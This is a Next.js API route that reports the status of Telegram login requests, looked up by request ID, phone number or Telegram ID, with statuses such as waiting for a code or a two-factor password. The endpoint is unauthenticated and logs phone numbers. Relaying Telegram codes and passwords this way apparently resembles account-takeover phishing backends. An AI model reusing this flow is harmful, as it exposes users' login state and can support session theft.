import { type NextRequest, NextResponse } from "next/server"
import { getAuthRequest, getLatestAuthRequestByPhone, getAuthRequestByTelegramId } from "@/lib/auth-store"

// GET /api/telegram/check-status - Проверить статус запроса (вызывается сайтом)
export async function GET(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url)
    const requestId = searchParams.get("requestId")
    const phone = searchParams.get("phone")
    const telegramId = searchParams.get("telegramId")

    console.log(`[v0] [check-status] requestId=${requestId}, phone=${phone}, telegramId=${telegramId}`)

    const candidates: Array<{ source: string; request: ReturnType<typeof getAuthRequest> }> = []

    if (requestId) {
      const req = getAuthRequest(requestId)
      if (req) {
        candidates.push({ source: "requestId", request: req })
        console.log(`[v0] [check-status] Found by requestId: status=${req.status}`)
      }
    }

    if (telegramId) {
      const req = getAuthRequestByTelegramId(telegramId)
      if (req) {
        candidates.push({ source: "telegramId", request: req })
        console.log(`[v0] [check-status] Found by telegramId: status=${req.status}`)
      }
    }

    if (phone) {
      const req = getLatestAuthRequestByPhone(phone)
      if (req) {
        candidates.push({ source: "phone", request: req })
        console.log(`[v0] [check-status] Found by phone: status=${req.status}`)
      }
    }

    if (!requestId && !phone && !telegramId) {
      return NextResponse.json({ success: false, error: "requestId, phone or telegramId is required" }, { status: 400 })
    }

    if (candidates.length === 0) {
      console.log(`[v0] [check-status] No request found`)
      return NextResponse.json({
        success: true,
        status: "pending",
        message: "Ожидание...",
        processed: false,
      })
    }

    const statusPriority: Record<string, number> = {
      waiting_password: 100,
      success: 90,
      error: 80,
      waiting_code: 70,
      invalid_code: 60,
      invalid_password: 60,
      pending: 10,
    }

    // Выбираем запрос с наивысшим приоритетом статуса, при равенстве - самый свежий
    const best = candidates.reduce((best, current) => {
      const bestPriority = statusPriority[best.request?.status || "pending"] || 0
      const currentPriority = statusPriority[current.request?.status || "pending"] || 0

      if (currentPriority > bestPriority) {
        return current
      }
      if (currentPriority === bestPriority && (current.request?.timestamp || 0) > (best.request?.timestamp || 0)) {
        return current
      }
      return best
    })

    const authRequest = best.request

    console.log(
      `[v0] [check-status] Selected from ${best.source}: status=${authRequest?.status}, requestId=${authRequest?.requestId}`,
    )

    return NextResponse.json({
      success: true,
      requestId: authRequest?.requestId,
      status: authRequest?.status,
      message: authRequest?.message,
      error: authRequest?.error,
      processed: authRequest?.processed,
    })
  } catch (error) {
    console.error("[API] Error checking status:", error)
    return NextResponse.json({ success: false, error: "Internal server error" }, { status: 500 })
  }
}
